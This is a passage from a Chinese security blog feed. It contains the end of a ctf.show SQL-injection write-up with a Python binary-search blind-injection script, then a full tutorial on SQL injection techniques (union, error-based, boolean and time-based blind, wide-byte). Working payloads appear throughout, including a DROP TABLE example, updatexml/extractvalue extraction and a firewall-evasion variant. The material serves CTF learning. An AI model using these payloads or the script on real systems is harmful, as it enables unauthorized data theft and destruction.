class="line">&#125;</span><br></pre></td></tr></table></figure><p>用户名和进行了额外过滤，即禁止将查询内容导出，同时也禁用了<code>ascii</code>关键字</p><p>除了比较两个字符的ascii码，我们可以直接使用大于号<code>&gt;</code>来比较两个字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> concat</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://9d7f92d3-684e-4e4f-a9fd-f103712ccac3.challenge.ctf.show/api/&#x27;</span></span><br><span class="line"><span class="comment"># 表名 CtFsHOw&#123;FL0G,CtFsHOw&#123;usEr</span></span><br><span class="line"><span class="comment"># payload = &quot;0&#x27; or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)&gt;&#x27;&#123;&#125;&#x27;,1,0) -- &quot;</span></span><br><span class="line"><span class="comment"># 列名 ID,F1AG,ID,usErNAME,pAss</span></span><br><span class="line"><span class="comment"># payload = &quot;0&#x27; or if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database()),&#123;&#125;,1)&gt;&#x27;&#123;&#125;&#x27;,1,0) -- &quot;</span></span><br><span class="line"><span class="comment"># 详细值</span></span><br><span class="line"><span class="comment"># payload = &quot;0&#x27; or if(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1)&gt;&#x27;&#123;&#125;&#x27;,1,0) -- &quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload  = <span class="string">&quot;0&#x27; or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)&gt;&#x27;&#123;&#125;&#x27;,1,0) -- &quot;</span></span><br><span class="line">true_flag = <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    end = <span class="number">255</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> (<span class="built_in">abs</span>(start-end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        p = (start + end) // <span class="number">2</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: payload.<span class="built_in">format</span>(index, <span class="built_in">chr</span>(p)),</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                response = requests.post(url, data=data)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> true_flag <span class="keyword">in</span> response.text:</span><br><span class="line">            start = p</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = p</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    result += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    index += <span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="web192（布尔盲注-过滤2）"><a href="#web192（布尔盲注-过滤2）" class="headerlink" title="web192（布尔盲注+过滤2）"></a>web192（布尔盲注+过滤2）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|ascii|ord|hex/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题将ascii和ord等关键字禁用</p><p>依然可以使用上一题的盲注脚本</p>]]></content>
      
      
      <categories>
          
          <category> CTF Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF Web SQL注入</title>
      <link href="/posts/1dc1c5acd0e2/"/>
      <url>/posts/1dc1c5acd0e2/</url>
      
        <content type="html"><![CDATA[<h2 id="涉及的数据库知识"><a href="#涉及的数据库知识" class="headerlink" title="涉及的数据库知识"></a>涉及的数据库知识</h2><h3 id="union"><a href="#union" class="headerlink" title="union"></a>union</h3><p>联合查询：将两条SQL语句的结果一起输出</p><p>语法：<code>select语句1 union select语句2</code></p><p>使用条件：前后两个语句的查询结果的字段数相同</p><h3 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h3><p>结果排序：该函数原本用于将查询结果排序</p><p>语法：<code>select * from table_name order by column_name</code></p><p>通过order by遍历字段序号可以得到原有查询语句输出结果有几个字段</p><h3 id="database"><a href="#database" class="headerlink" title="database()"></a>database()</h3><p>输出当前数据库的库名</p><h3 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h3><p>information_schema为系统自带的数据库</p><p>里面有一个tables表，该表存放着数据库和数据表的关联，其中table_schema为存储数据库名的字段，table_name为存储表名的字段</p><p><code>select table_name from information_schema.tables where table_schema=database()</code>会输出当前数据库中的所有表名</p><p>还有一个columns表，该表存放着数据表和字段的关联，使用该表查询某表中有哪些字段时，需要同时指定是哪个数据的哪个表</p><p><code>select column_name from information_schema.columns where table_name=&#39;admin&#39;and table_schema=database()</code>会输出指定数据表中的所有字段名</p><h3 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h3><p>用于分页</p><p>语法：<code>select * from table_name limit n,m;</code></p><p>n表示从第n行开始，m表示取m条数据</p><h3 id="空格注释"><a href="#空格注释" class="headerlink" title="--空格注释"></a><code>--空格</code>注释</h3><p>遇到引号如 <code>select * from user where id=&#39;$id&#39;</code></p><p>可以先将前面的引号闭合，再将后面的引号用 <code>-- qwe</code>注释掉</p><p>例如如下的payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span><span class="string">&#x27; union select 1,table_name,3 from information_schema.tables where table_schema=database() -- qwe</span></span><br></pre></td></tr></table></figure><p>此处的qwe只是为了演示出—后面的空格，并无实际意义</p><h3 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h3><p>用于替换字符串</p><p>语法：<code>REPLACE (String,from_str,to_str)</code></p><p>将<code>String</code>中所有出现的<code>from_str</code>替换为<code>to_str</code></p><h3 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h3><p>SELECT INTO 语句从一个表中选取数据，然后把数据插入另一个表中，常用于创建表的备份复件或者用于对记录进行存档。</p><p>在 SELECT 查询语句中使用 INTO OUTFILE 参数可以将查询结果保存到文本文件中。</p><p>语法：<code>SELECT ...  INTO OUTFILE &#39;file_name&#39;</code></p><div class="note primary flat"><p>如果题目条件允许，可以执行<code>show variables like &#39;%secure_file_priv%&#39;</code>来查看允许导出结果的目录，MySQL服务只允许在这个目录中执行文件的导入和导出操作。</p></div><h3 id="like"><a href="#like" class="headerlink" title="like"></a>like</h3><p><strong>LIKE</strong> 操作符用于在 WHERE 子句中搜索列中的指定模式</p><p>现在，我们希望从上面的 “Persons” 表中选取居住在以 “N” 开始的城市里的人：</p><p>我们可以使用下面的 SELECT 语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Persons</span><br><span class="line"><span class="keyword">WHERE</span> City <span class="keyword">LIKE</span> <span class="string">&#x27;N%&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>提示：</strong><code>%</code> 可用于定义通配符（模式中缺少的字母）</p><p>常见通配符：% 表示可有零个或多个任意字符; _ 表示需要一个任意字符；</p><h3 id="GROUP-BY"><a href="#GROUP-BY" class="headerlink" title="GROUP BY"></a>GROUP BY</h3><p>GROUP BY 语句用于结合聚合函数（如 COUNT()、MAX() 等），根据一个或多个列对结果集进行分组。</p><p>GROUP BY 可以<strong>配合聚合函数一起使用</strong>，通过使用聚合函数，在分组之后可以对<strong>组内结果</strong>进行计数（COUNT）、求和（SUM），求平均数（AVG）操作等。</p><p>GROUP BY会先<strong>按照指定字段的值是否相同</strong>来将<strong>数据分组</strong></p><p>更加详细的介绍可以看下面这篇：</p><p><a href="https://blog.csdn.net/liu_shi_jun/article/details/51329472">GROUP BY与COUNT用法详解<em>group by count</em>鲲鹏之上的博客-CSDN博客</a></p><h3 id="HAVING"><a href="#HAVING" class="headerlink" title="HAVING"></a>HAVING</h3><p>HAVING 子句可以<strong>筛选</strong>通过 GROUP BY 分组且聚合后的各组数据。</p><p>聚合函数（avg、sum、max、min、count），<strong>不能作为条件放在where之后</strong>，但<strong>可以放在having之后</strong></p><h3 id="GROUP-BY、HAVING、WHERE之间的关系"><a href="#GROUP-BY、HAVING、WHERE之间的关系" class="headerlink" title="GROUP BY、HAVING、WHERE之间的关系"></a>GROUP BY、HAVING、WHERE之间的关系</h3><p>在语句的位置上，where在group by前， having在group by 之后</p><p>在执行顺序上，以下面这个SQL语句为例</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select city ,count(*) as num from staff  where age&gt; 19 group by city having num &gt;= 3;</span><br></pre></td></tr></table></figure><ol><li>执行where子句查找符合年龄大于19的员工数据</li><li>group by子句对员工数据，根据城市分组。</li><li>对group by子句形成的城市组，运行聚集函数计算每一组的员工数量值；</li><li>最后用having子句选出员工数量大于等于3的城市组。</li></ol><p>所以执行顺序为：<strong>WHERE</strong>➡<strong>GROUP BY</strong>➡<strong>聚合函数</strong>➡<strong>HAVING</strong></p><h3 id="regexp"><a href="#regexp" class="headerlink" title="regexp"></a>regexp</h3><p><code>REGEXP</code>的基本语法如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">column_name REGEXP <span class="keyword">pattern</span></span><br></pre></td></tr></table></figure><p>这里，<code>column_name</code> 是要搜索的列，<code>pattern</code> 是正则表达式模式。</p><p>regexp表达式可以放在where后面作为查询的限制条件，也可以搭配if或者case，作为条件语句</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>SQL注入就是在数据交互中，前端数据传到后台时没有做严格的判断，导致传进来的数据被拼接到sql语句中，被当作sql语句的一部分进行执行，从而导致数据泄露，丢失甚至服务器瘫痪。如果代码中没有过滤或者过滤不严谨是会出现漏洞的。</p><p>SQL注入攻击的本质，是把用户输入的数据当做代码执行</p><p>SQL注入的条件是可控变量和可带入数据库查询</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h3><h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><ol><li><p><code>and 1=1</code> 页面不变<br><code>and 1=2</code> 页面出现区别<br>则该地址可能存在注入漏洞</p><div class="note warning flat"><p>这种方法太过常见，可能会被一些站点的防火墙拦截。</p><p>此时可以稍微做一些变形，比如<code>%26%26 -1 like -1</code></p></div></li><li><p><code>id = 杂乱字符串</code></p><p>若页面出现区别，则该地址可能存在注入漏洞</p></li><li><p>通过运算符检测漏洞</p><p><code>id = 2-1</code>，id运算结果与原来一致</p><p>如果页面也一致，则该地址可能存在注入漏洞</p></li></ol><p>如果测试注入点时页面返回404，则大概率没有注入点</p><h3 id="注入点类型"><a href="#注入点类型" class="headerlink" title="注入点类型"></a>注入点类型</h3><h4 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h4><p>POST和GET注入的区别就是注入点位置发生了变化，在浏览器中已经无法直接进行查看与修改。</p><p><strong>POST注入高危点</strong>：网页中的登录框、查询框等各种和数据库有交互的框</p><p>手动POST注入一般使用<strong>burpsuite</strong>工具进行抓包</p><p>使用<strong>sqlmap</strong>自动进行POST注入有两种方法</p><p>可以使用<code>--forms</code>对页面的表单进行测试</p><p>也可以先用burpsuite抓包，并将数据包保存，然后使用<code>-r 数据包目录</code>对数据包中的POST注入点进行分析</p><h4 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h4><p>数字型注入是指在一个期望数字的输入位置注入SQL代码。因为数字型数据通常不需要引号包围，所以注入相对简单。例如，一个基于数字的 SQL 注入可能在一个像这样的查询中实现：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> [input]</span><br></pre></td></tr></table></figure><p>如果正常输入为 <code>1</code>，那么查询变为 <code>SELECT * FROM users WHERE id = 1</code>。如果输入为 <code>1 OR 1=1</code>，则查询变为 <code>SELECT * FROM users WHERE id = 1 OR 1=1</code>，这将返回所有用户的数据，因为 <code>1=1</code> 总是真。</p><h4 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h4><p>字符型注入发生在处理字符串数据的查询中。攻击者必须闭合开放的字符串（使用引号），然后注入额外的 SQL 代码。例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;[input]&#x27;</span></span><br></pre></td></tr></table></figure><p>正常输入可能是 <code>alice</code>，查询为 <code>SELECT * FROM users WHERE username = &#39;alice&#39;</code>。如果输入是 <code>&#39;; DROP TABLE users; --</code>，那么查询就变成了 <code>SELECT * FROM users WHERE username = &#39;&#39;; DROP TABLE users; --&#39;</code>，这会尝试删除整个 <code>users</code> 表。</p><h4 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h4><p>搜索型注入通常出现在搜索功能中，特别是当查询设计成模糊匹配用户输入时。例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> name <span class="keyword">LIKE</span> <span class="string">&#x27;%[input]%&#x27;</span></span><br></pre></td></tr></table></figure><p>这种情况我们仍然<strong>可以只闭合前面的引号</strong></p><h4 id="Insert-update-delete注入"><a href="#Insert-update-delete注入" class="headerlink" title="Insert/update/delete注入"></a>Insert/update/delete注入</h4><p>当页面中存在修改账号信息、注册账号、删除账号等操作时，事实上就是存在插入、修改数据库数据的操作</p><p>insert型注入相关的sql语句形式 <code>INSERT INTO table_name VALUES (值1, 值2,....)或者INSERT INTO table_name (列1, 列2,...) VALUES (值1, 值2,....)</code> </p><p>update型注入相关的sql语句形式： <code>UPDATE 表名称 SET 列名称 = 新值 WHERE 列名称 = 某值</code> </p><p>delete型注入相关的sql语句形式：<code>DELETE FROM 表名称 WHERE 列名称 = 值</code></p><p>这些类型的注入点由于没有select语句，所以适合使用</p><h4 id="HEADER注入"><a href="#HEADER注入" class="headerlink" title="HEADER注入"></a>HEADER注入</h4><p>HEADER注入通过修改请求报文中的请求头部（head）来进行注入。</p><p> PHP中通常使用<strong>$_SERVER</strong>数组来收集请求头信息</p><p>手动HEAD注入可以使用<strong>burpsuite</strong>工具进行抓包</p><h4 id="Order-By注入"><a href="#Order-By注入" class="headerlink" title="Order By注入"></a>Order By注入</h4><p>当我们的注入点在SQL语句的<code>Order By</code>关键字之后时，常规的联合注入无法实现，因为通常回显的内容是前半段语句</p><p>那么我们可以考虑使用报错注入和盲注</p><p>针对Order By关键字，可以<strong>使用<code>rand()</code>函数来构造布尔盲注的条件</strong></p><p>由于<code>rand(0)</code>和<code>rand(1)</code>返回的内容不同，我们可以将判断语句放在rand中，这样布尔值不同，回显的结果也不同</p><p>当然也可以使用时间盲注，不过由于查询的条数比较多，所以<strong>延时时间最好设短一些</strong></p><h2 id="闭合方式"><a href="#闭合方式" class="headerlink" title="闭合方式"></a>闭合方式</h2><h3 id="闭合"><a href="#闭合" class="headerlink" title="闭合"></a>闭合</h3><p>在注入漏洞中，构造payload语句的精髓之一在于闭合</p><p>不同的场景下我们需要通过猜测源码中的SQL语句、试验不同的方法来构造闭合</p><h4 id="转义符号报错得到闭合方式"><a href="#转义符号报错得到闭合方式" class="headerlink" title="转义符号报错得到闭合方式"></a>转义符号报错得到闭合方式</h4><p>如果程序开启了sql语句的报错信息，可以尝试利用转义符号报错得到闭合方式</p><p>当原语句的闭合字符遇到转义字符时，会被转义，那么没有闭合符的语句就不完整了，导致报错，通过报错信息我们就可以推断出闭合符。</p><p>payload示例如下</p><p><code>?id=1\</code></p><h4 id="使用表达式来判断是否带括号及引号类型（适用无报错）"><a href="#使用表达式来判断是否带括号及引号类型（适用无报错）" class="headerlink" title="使用表达式来判断是否带括号及引号类型（适用无报错）"></a>使用表达式来判断是否带括号及引号类型（适用无报错）</h4><p>测试<code>?id=2&#39;%26%26 &#39;1&#39;=&#39;1</code>和<code>?id=2&quot;%26%26 “1&quot;=&quot;1</code>这两个payload</p><ul><li><p>如果都回显id=2的用户，则说明不带括号。此时单双引号需要使用<code>?id=1&#39;</code>和<code>?id=1&quot;</code>来进一步判断</p></li><li><p>哪一个payload如果回显id=1的用户，说明原SQL语句带括号，且使用的是该payload中的引号类型</p></li><li>如果都没有回显，说明可能是数字型注入</li></ul><p>这种判断方法比较<strong>适合在程序关闭了报错信息的情况下使用</strong></p><h4 id="时间盲注遍历闭合方式"><a href="#时间盲注遍历闭合方式" class="headerlink" title="时间盲注遍历闭合方式"></a>时间盲注遍历闭合方式</h4><p>由于时间盲注的场景中，页面没有任何回显，我们只能通过延时时间来判断正确的闭合方式</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and sleep(5) --+</span></span><br><span class="line"><span class="string">?id=1&quot; and sleep(5) --+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>) <span class="keyword">and</span> sleep(<span class="number">5</span>) <span class="comment">--+</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) and sleep(5) --+</span></span><br><span class="line"><span class="string">?id=1&quot;) and sleep(5) --+</span></span><br></pre></td></tr></table></figure><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>常规情况下一般是通过在payload的最后加上注释符，将后半段语句整个注释掉</p><p>SQL语句中的注释符还是挺多的</p><ol><li><p><code>--空格</code></p><p>该注释符在GET注入时也常被写作<code>--+</code>，因为<code>+</code>放在url中会被认为是空格符</p></li><li><p><code>#</code></p><p><code>#</code>在URL 中会被认为是锚点，所以 如果想要在GET注入中使用该注释符，需要对其需要进行url编码。<code>#</code>的url 编码为<code>%23</code></p></li><li><p><code>;%00</code></p><p>分号可以结束当前sql语句，而<code>%00</code>会让程序认为这是字符串的末尾</p></li></ol><h2 id="注入手段"><a href="#注入手段" class="headerlink" title="注入手段"></a>注入手段</h2><h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>联合查询主要是运用SQL的union语法</p><p>将需要执行的语句与原语句使用<strong>union</strong>拼接在一起</p><h4 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h4><p>从<code>order by 1</code>开始一直到<code>order by n</code>，观察是否有查询结果，用来判断当前数据表有多少字段</p><div class="note primary flat"><p>判断字段数可以使用<strong>二分法</strong>，先判断1和一个大数n，若n无显示则判断$\frac{n}{2} $</p><p>若$\frac{n}{2} $无显示则判断$\left [ \frac{n}{2} ,n \right ] $之间的数，否则判断$\left [ 1,\frac{n}{2}  \right ] $之间的数，以此类推</p></div><h4 id="判断数据显示位"><a href="#判断数据显示位" class="headerlink" title="判断数据显示位"></a>判断数据显示位</h4><p>若 注入语句<code>-1 union select 1,2,3</code>，而页面只输出2</p><p>说明第二个字段为当前页面的<strong>输出点（显示位）</strong>，数据库只输出该字段上的内容 </p><div class="note info flat"><p>这里使用-1使之前的语句查询无结果，即<strong>空查询</strong>，则显示的时候就会显示union之后的第二条语句。</p></div><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>报错注入 （Error-based injuction），就是利用数据库的某些机制，<strong>人为地制造错误条件</strong>，使得<strong>查询结果能够出现在错误信息中</strong>。</p><p>当代码中使用<code>die(mysql_error())</code>来返回错误信息时，我们可以使用报错注入</p><h4 id="XPATH报错注入"><a href="#XPATH报错注入" class="headerlink" title="XPATH报错注入"></a>XPATH报错注入</h4><p>通过输入非法路径来导致<code>XPATH syntax error</code></p><h5 id="extractvalue-arg1-arg2"><a href="#extractvalue-arg1-arg2" class="headerlink" title="extractvalue(arg1,arg2)"></a>extractvalue(arg1,arg2)</h5><p>接受两个参数，arg1:XML文档，arg2:XPATH语句<br><strong>条件</strong>：mysql5.1及以上版本<br>标准payload：<code>and extractvalue(1,concat(0x7e,(select user()),0x7e))</code><br>返回结果：<code>XPATH syntax error.’~root@localhost~’</code></p><h5 id="updatexml-arg1-arg2-arg3"><a href="#updatexml-arg1-arg2-arg3" class="headerlink" title="updatexml(arg1,arg2,arg3)"></a>updatexml(arg1,arg2,arg3)</h5><p>arg1为xml文档对象的名称，arg2为xpath格式的字符串；arg3为string格式替换查找到的符合条件的数据<br><strong>条件</strong>：mysql5.1.5及以上版本<br>标准payload：<code>and updatexml(1,concat(0x7e,(select user()),0x7e),1)</code><br>返回结果：<code>XPATH syntax error:’~root@localhost~’</code></p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>布尔盲注（Boolean-based Blind SQL Injection）属于SQL注入的一种形式。其主要原理是通过向数据库发送特制的SQL查询语句，根据应用程序的不同响应（通常是真或假）来推断数据库中的信息。布尔盲注不直接显示数据库中的数据，而是通过观察应用程序对注入恶意SQL语句的响应来推测数据。</p><h4 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h4><p>布尔盲注强调一个<strong>盲</strong>字，所以每次我们只能从返回的布尔值获取有关数据库的某一项信息</p><p>例如通过<code>length()</code>函数来判断字符串的长度，通过<code>substr()</code>或<code>substring()</code>逐个试出字符串中的每个字符</p><p>当然，我们想要获取数据库中的某个数据，肯定是要从库、表、字段逐步来获取信息</p><p>下面是常见的注入流程：</p><ul><li>求当前数据库长度</li><li>求当前数据库表的ASCII</li><li>求当前数据库中表的个数</li><li>求当前数据库中其中一个表名的长度</li><li>求当前数据库中其中一个表名的ASCII</li><li>求列名的数量</li><li>求列名的长度</li><li>求列名的ASCII</li><li>求字段的数量</li><li>求字段内容的长度</li><li>求字段内容对应的ASCII</li></ul><h4 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h4><ul><li><code>ascii()</code>函数，返回字符ascii码值<br>参数 : str单字符</li><li><code>length()</code> 函数，返回字符串的长度<br>参数 : str 字符串</li><li><code>left()</code> 函数，返回从左至右截取固定长度的字符串<br>参数str,length<br>str : 字符串<br>length：截取长度</li><li><code>substr()/substring()</code>函数 ， 返回从pos位置开始到length长度的子字符串<br>参数，str，pos，length<br>str: 字符串<br>pos：开始位置</li></ul><h4 id="payload示例"><a href="#payload示例" class="headerlink" title="payload示例"></a>payload示例</h4><p>以数据库这一层为例，我们需要得到数据库名称的长度，然后求数据库名称中有哪些字符</p><p>首先获取长度，我们可以使用<strong>二分法</strong>，先选一个较大的数，将其与<code>leng&#39;r&#39;h</code>的值进行比较</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span> = <span class="number">1</span> <span class="keyword">and</span> (length(database())&lt;<span class="number">8</span>) --+</span><br><span class="line">?<span class="built_in">id</span> = <span class="number">1</span> <span class="keyword">and</span> (length(database())&gt;<span class="number">8</span>) --+</span><br></pre></td></tr></table></figure><p>如果长度小于8，则再与4进行比较</p><p>获取数据库名时，以<code>left()</code>函数为例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-- 从左至右截取一个字符</span><br><span class="line">?<span class="built_in">id</span> = <span class="number">1</span> <span class="keyword">and</span> (left(database(),<span class="number">1</span>)=<span class="string">&#x27;s&#x27;</span>) --+</span><br><span class="line">-- 从左只有截取两个字符</span><br><span class="line">?<span class="built_in">id</span> = <span class="number">1</span> <span class="keyword">and</span> (left(database(),<span class="number">2</span>)=<span class="string">&#x27;se&#x27;</span>) --+</span><br></pre></td></tr></table></figure><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>时间盲注是指基于时间的盲注，也叫延时注入，根据页面的响应时间来判断是否存在注入。</p><h4 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h4><p>时间盲注使用的优先级并不高，通常是在联合注入、<a href="https://so.csdn.net/so/search?q=报错注入&amp;spm=1001.2101.3001.7020">报错注入</a>、布尔盲注都无法使用时才会考虑使用：</p><ol><li>页面没有回显位置（联合注入无法使用）</li><li>页面不显示数据库的报错信息（报错注入无法使用）</li><li>无论成功还是失败，页面只响应一种结果（布尔盲注无法使用）</li></ol><h4 id="判断注入点-1"><a href="#判断注入点-1" class="headerlink" title="判断注入点"></a>判断注入点</h4><p>依次尝试以下类型的测试payload，延时5秒以上则说明判断成立，即存在注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> if(<span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">3</span>) <span class="comment">-- a</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(1,sleep(5),3) -- a</span></span><br></pre></td></tr></table></figure><p><code>if(1,sleep(5),3)</code> 是一个条件表达式，其中 <code>1</code> 总是真（因为1在逻辑上代表真），因此执行 <code>sleep(5)</code>，这使得数据库暂停5秒。</p><p>IF语句基本语法如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IF(<span class="keyword">condition</span>, true_value, false_value)</span><br></pre></td></tr></table></figure><ul><li><strong>condition</strong>: 这是需要评估的条件表达式。</li><li><strong>true_value</strong>: 如果条件为真时返回的值。</li><li><strong>false_value</strong>: 如果条件为假时返回的值。</li></ul><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><div class="note info flat"><p>计算机底层由二进制存储数据，不同的编码映射着不同的二进制数据，我们以8位二进制为单字节，也称标准字节。宽字节指比标准字节有更多的字节<br>常见的单字节编码：ASCII<br>常见的宽字节编码：GB2312,GBK,GB18030,BIG5等</p><p>以GBK为例，它以2个字节进行编码</p></div><p>服务端对用户输入的敏感数据（主要是单双引号等特殊字符）进行了转义，如利用mysql_real_escape_string()或addslashes()等函数</p><p>它会将用户输入的<code>/?id=1&#39;</code>转换为<code>/?id=1\&#39;</code>·，这样的目的是为了防止sql注入构造闭合.</p><p>此时我们可以使用宽字节注入来<strong>摧毁转义</strong>，当然前提是PHP发送请求到MySql时使用了语句<code>SET NAMES &#39;gbk&#39;</code> 或是<code>set character_set_client =gbk</code> 